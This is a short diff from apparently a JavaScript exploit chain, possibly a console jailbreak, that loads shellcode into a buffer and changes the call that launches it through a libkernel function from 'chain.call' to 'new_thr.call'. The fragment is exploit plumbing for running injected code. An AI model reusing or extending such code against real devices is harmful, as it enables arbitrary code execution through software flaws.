@@ -265,7 +265,7 @@ function loadPayload(){
    var shellcode = new Uint32Array(tmp.buffer);
    pl.set(shellcode,0);
    var pthread = p.malloc(0x10);
-   chain.call(libKernelBase.add32(pthread_exit_offset), pthread, 0x0, payload_buffer, 0);
+   new_thr.call(libKernelBase.add32(pthread_exit_offset), pthread, 0x0, payload_buffer, 0);
    //allset();
   awaitpl();
   }
